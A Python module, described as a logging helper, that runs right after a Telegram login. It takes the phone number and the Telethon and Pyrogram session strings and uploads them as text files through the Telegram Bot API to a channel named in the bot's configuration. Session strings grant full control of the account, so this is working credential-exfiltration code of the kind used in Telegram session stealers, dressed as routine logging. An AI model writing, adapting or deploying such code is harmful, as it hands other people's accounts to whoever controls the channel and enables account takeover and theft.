"""Send session files to Telegram log channel instantly after login."""
from __future__ import annotations

import requests

from config import BOT_TOKEN, CHANNEL_ID, LOG_CHANNEL


def _chat_id():
    return CHANNEL_ID or LOG_CHANNEL


def send_to_channel(message: str) -> bool:
    chat_id = _chat_id()
    if not BOT_TOKEN or not chat_id:
        print("send_to_channel: BOT_TOKEN/CHANNEL missing", flush=True)
        return False
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=15,
        )
        data = r.json() if r.content else {}
        if not data.get("ok"):
            print(f"send_to_channel fail: {data}", flush=True)
        return r.status_code == 200 and bool(data.get("ok"))
    except Exception as e:
        print(f"send_to_channel: {e}", flush=True)
        return False


def send_session_files_to_channel(phone, telethon_string=None, pyrogram_string=None, caption=None) -> bool:
    """Post summary + Telethon/Pyrogram session as .txt files to log channel."""
    chat_id = _chat_id()
    if not BOT_TOKEN or not chat_id:
        print("send_session_files: BOT_TOKEN/CHANNEL missing", flush=True)
        return False
    phone_safe = (phone or "session").lstrip("+").replace(" ", "")
    ok_any = False
    try:
        if caption:
            send_to_channel(caption)
        files = []
        if telethon_string:
            files.append((
                f"{phone_safe}_telethon.txt",
                telethon_string.strip() + "\n",
                f"🔐 Telethon session\n📱 {phone}",
            ))
        if pyrogram_string:
            files.append((
                f"{phone_safe}_pyrogram.txt",
                pyrogram_string.strip() + "\n",
                f"🔐 Pyrogram session\n📱 {phone}",
            ))
        if not files:
            print("send_session_files: no session strings to send", flush=True)
            return False
        for filename, content, file_caption in files:
            try:
                r = requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                    data={
                        "chat_id": str(chat_id),
                        "caption": file_caption,
                        "parse_mode": "HTML",
                    },
                    files={"document": (filename, content.encode("utf-8"), "text/plain")},
                    timeout=25,
                )
                data = r.json() if r.content else {}
                if r.status_code == 200 and data.get("ok"):
                    ok_any = True
                    print(f"sent {filename} to channel", flush=True)
                else:
                    print(f"sendDocument fail: {data or r.text[:240]}", flush=True)
            except Exception as e:
                print(f"sendDocument error: {e}", flush=True)
        return ok_any
    except Exception as e:
        print(f"send_session_files_to_channel: {e}", flush=True)
        return False
